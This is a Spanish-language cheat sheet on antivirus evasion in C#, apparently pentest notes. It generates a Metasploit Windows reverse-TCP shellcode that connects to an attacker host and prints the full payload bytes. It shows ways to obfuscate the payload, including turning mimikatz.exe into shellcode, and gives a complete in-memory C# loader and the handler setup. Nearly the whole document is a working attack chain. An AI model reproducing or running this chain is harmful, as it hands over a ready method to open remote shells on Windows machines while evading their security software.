# Evasión de antivirus con CSharp 

Tags: #AD #CSharp #Windows #Metasploit #Msfvenom #Evasion 

* [Bypassing AV by CSharp](https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/index.htm?page=Chapter%2013.html)
* [Framework MsfMania](https://github.com/lepotekil/MsfMania)

## Msfvenom (Crear una Reverse Shell)

```bash 
# Generar el payload en CSharp donde se obtiene en formato hexadecimal para utilizarlo en Visual Studio 
❯ msfvenom --platform windows -p windows/shell/reverse_tcp lhost=IP_Kali lport=443 -f csharp


Notas:
	- A los bytes se les hará un tratamiento para que no sean detectados donde:
		  0x --> *
		  ,  --> colocar nada (quitarla con el espacio)
```

```bash 
byte[] buf = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,
0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x68,0x0a,0x0a,0x0a,0x0a,0x68,0x02,0x00,0x01,0xbb,
0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };

--------      Covertirlo de la siguiente manera:      ---------

## Opción 1: Pasarlo a string 
"fc*e8*8f*00*00*00*60*31*d2*64*8b*52*30*89*e5*8b*52*0c*8b*52*14*31*ff*8b*72*28*0f*b7*4a*26*31*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*01*c7*49*75*ef*52*8b*52*10*8b*42*3c*57*01*d0*8b*40*78*85*c0*74*4c*01*d0*8b*48*18*50*8b*58*20*01*d3*85*c9*74*3c*49*8b*34*8b*01*d6*31*ff*31*c0*ac*c1*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*3b*7d*24*75*e0*58*8b*58*24*01*d3*66*8b*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*d0*89*44*24*24*5b*5b*61*59*5a*51*ff*e0*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*68*33*32*00*00*68*77*73*32*5f*54*68*4c*77*26*07*89*e8*ff*d0*b8*90*01*00*00*29*c4*54*50*68*29*80*6b*00*ff*d5*6a*0a*68*0a*0a*0a*0a*68*02*00*01*bb*89*e6*50*50*50*50*40*50*40*50*68*ea*0f*df*e0*ff*d5*97*6a*10*56*57*68*99*a5*74*61*ff*d5*85*c0*74*0a*ff*4e*08*75*ec*e8*67*00*00*00*6a*00*6a*04*56*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*36*8b*36*6a*40*68*00*10*00*00*56*6a*00*68*58*a4*53*e5*ff*d5*93*53*6a*00*56*53*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7d*28*58*68*00*40*00*00*6a*00*50*68*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*61*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5"

## Opción 2: Darle la vuelta al payload 
Usando: https://yupana-engineering.com/online-reverse-byte-array

Nota:
	- Quitar los saltos de linea del original e iniciar desde 0xfc,0xe8,0x8f, hasta 0x53,0xff,0xd5 sin colocar 'byte[] buf = new byte[354] {}'

## Opción 3: Usar la tool exec2shell 
❯ git clone https://github.com/daVinci13/Exe2shell       # Descargar la herramienta 
❯ python3 exe2shell.py mimikatz.exe                      # Convertir a shellcode para después pasarlo a un string, colocarlo en el script y evadir la detección 
```

## Windows - Visual Studio 2026

* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Compilar en Visual Studio la revershell 
1 Crear un nuevo proyecto
2 Seleccionar "C#, Windows y Consola" en las tres opciones y escoger "Aplicación de consola (.NET Framework)"
3 Eliminar el código por defecto 
4 Escribir el código siguiente y compilarlo "Compilar TestShell"

```csharp 
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Win32

{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            string payload = "fc*e8*8f*00*00*00*60*31*d2*64*8b*52*30*89*e5*8b*52*0c*8b*52*14*31*ff*8b*72*28*0f*b7*4a*26*31*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*01*c7*49*75*ef*52*8b*52*10*8b*42*3c*57*01*d0*8b*40*78*85*c0*74*4c*01*d0*8b*48*18*50*8b*58*20*01*d3*85*c9*74*3c*49*8b*34*8b*01*d6*31*ff*31*c0*ac*c1*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*3b*7d*24*75*e0*58*8b*58*24*01*d3*66*8b*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*d0*89*44*24*24*5b*5b*61*59*5a*51*ff*e0*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*68*33*32*00*00*68*77*73*32*5f*54*68*4c*77*26*07*89*e8*ff*d0*b8*90*01*00*00*29*c4*54*50*68*29*80*6b*00*ff*d5*6a*0a*68*0a*0a*0a*0a*68*02*00*01*bb*89*e6*50*50*50*50*40*50*40*50*68*ea*0f*df*e0*ff*d5*97*6a*10*56*57*68*99*a5*74*61*ff*d5*85*c0*74*0a*ff*4e*08*75*ec*e8*67*00*00*00*6a*00*6a*04*56*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*36*8b*36*6a*40*68*00*10*00*00*56*6a*00*68*58*a4*53*e5*ff*d5*93*53*6a*00*56*53*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7d*28*58*68*00*40*00*00*6a*00*50*68*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*61*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5";

            string[] temp_payload = payload.Split('*');
            byte[] payload_final = new byte[temp_payload.Length];

            for (int i = 0; i < temp_payload.Length; i++)
            {
                payload_final[i] = Convert.ToByte(temp_payload[i], 16);
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Iniciando Reverse shell");

            IntPtr funcAdrr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(payload_final, 0, funcAdrr, payload_final.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAdrr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## Metasploit 

```bash 
# Recibir la revereshell en Kali con metasploit 'handler'

❯ msfconsole -q 
❯ use exploit/multi/handler
❯ set payload windows/shell/reverse_tcp    # Colocar el mismo payload que en msfvenom
❯ show options 
❯ set lhost IP_Kali
❯ set lport 443 
❯ exploit 
```